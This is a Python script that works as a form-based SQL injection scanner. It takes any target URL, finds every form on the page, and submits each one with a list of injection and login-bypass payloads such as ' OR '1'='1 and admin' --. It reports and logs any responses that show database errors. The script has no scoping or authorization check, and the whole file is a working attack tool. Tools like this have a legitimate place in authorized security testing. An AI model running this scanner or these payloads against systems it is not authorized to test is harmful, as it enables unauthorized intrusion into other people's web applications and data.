import requests
from bs4 import BeautifulSoup
import logging
from urllib.parse import urljoin

# Setup logging
logging.basicConfig(
    filename='sql_form_scan.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# SQL injection payloads
SQL_PAYLOADS = [
    "'", "\"", "1=1", "' OR '1'='1", "' OR 1=1--", "'--", "'#", "\"#", "admin' --", "admin' #",
    "' OR '1'='1' --", "' OR 1=1#", "' OR 'a'='a", "' OR 1=1 LIMIT 1 --"
]

# SQL error signatures
SQL_ERRORS = [
    "you have an error in your sql syntax;",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "pg_query()",
    "mysql_fetch_array()",
    "ORA-01756",
    "SQLSTATE[HY000]",
]

def is_sql_error(text):
    return any(err.lower() in text.lower() for err in SQL_ERRORS)

def print_payloads():
    print("\n[+] Payloads that will be tested:")
    for p in SQL_PAYLOADS:
        print(f"   {repr(p)}")
    print()

def scan_forms_for_sqli(url):
    try:
        session = requests.Session()
        response = session.get(url, timeout=10)
        soup = BeautifulSoup(response.text, "html.parser")
        forms = soup.find_all("form")

        if not forms:
            print("[!] No forms found.")
            return

        print(f"[+] Found {len(forms)} form(s). Testing...\n")

        for idx, form in enumerate(forms, start=1):
            action = form.get("action") or url
            method = form.get("method", "get").lower()
            form_url = urljoin(url, action)

            inputs = form.find_all(["input", "textarea"])
            form_fields = {inp.get("name"): "test" for inp in inputs if inp.get("name")}

            for payload in SQL_PAYLOADS:
                test_data = {k: v + payload for k, v in form_fields.items()}
                try:
                    if method == "post":
                        res = session.post(form_url, data=test_data, timeout=10)
                    else:
                        res = session.get(form_url, params=test_data, timeout=10)

                    # Log every attempt
                    logging.info(f"Form #{idx} - {method.upper()} {form_url}")
                    logging.info(f"Payload: {repr(payload)}")
                    logging.info(f"Inputs: {test_data}")
                    logging.info(f"Status Code: {res.status_code}\n")

                    print(f"[+] Tested form #{idx} with payload: {repr(payload)}")

                    if is_sql_error(res.text):
                        print(f"[!] Possible SQL Injection on form #{idx} at {form_url}")
                        logging.warning(f"!!! SQL Injection found on form #{idx} using payload {repr(payload)}\n")

                except requests.RequestException as e:
                    logging.error(f"Connection error on form #{idx}: {str(e)}")
    except Exception as e:
        print(f"[!] Error: {e}")
        logging.error(f"Fatal error while scanning {url}: {e}")

if __name__ == "__main__":
    print("\n[--- Simple SQL Injection Scanner (Form-based) ---]")
    target = input("Enter the target URL (e.g., http://example.com/login): ").strip()

    print_payloads()
    scan_forms_for_sqli(target)

    print("\n[✔] Scan complete. Check 'sql_form_scan.log' for detailed results.")
